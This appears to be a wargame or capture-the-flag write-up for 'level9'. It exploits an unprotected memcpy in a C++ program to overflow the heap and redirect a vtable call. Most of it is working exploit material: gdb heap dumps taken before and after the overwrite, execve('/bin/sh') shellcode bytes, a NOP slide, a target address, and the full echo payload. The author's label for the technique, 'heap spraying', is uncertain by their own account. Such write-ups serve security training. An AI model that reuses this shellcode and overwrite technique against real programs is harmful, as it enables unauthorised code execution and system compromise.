# level9

For this level, the program is actually a C++ program with a class.
We use an unprotected memcpy to overwrite the heap, which allows us to redirect
a call to the vtable to our shellcode in memory. We redirect it to an address
in the middle of a nopslide the leads to a shellcode that executes a simple
`execve("/bin/sh")`. I believe this method is called "heap spraying" but I'm not
entirely sure.

## Useful infos

Before the expolit:  
```
(gdb) x/56x 0x0804a008
0x804a008:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071
0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21
```

After the exploit:  
```
(gdb) x/56x 0x0804a008
0x804a008:	0x08048848	0x0804a038	0x90909090	0x90909090
0x804a018:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a028:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a038:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a048:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a058:	0x90909090	0x6850c031	0x68732f2f	0x69622f68
0x804a068:	0x89e3896e	0xb0c289c1	0x3180cd0b	0x80cd40c0
0x804a078:	0x0804a00c	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21
```

First address:  
`\x38\xa0\x04\x08`

Shellcode:  
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`

Padding until address:  
`AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAA`

Nopslide:  
`\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90`

The exploit:  
`echo -ne "\x38\xa0\x04\x08\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x0c\xa0\x04\x08"`
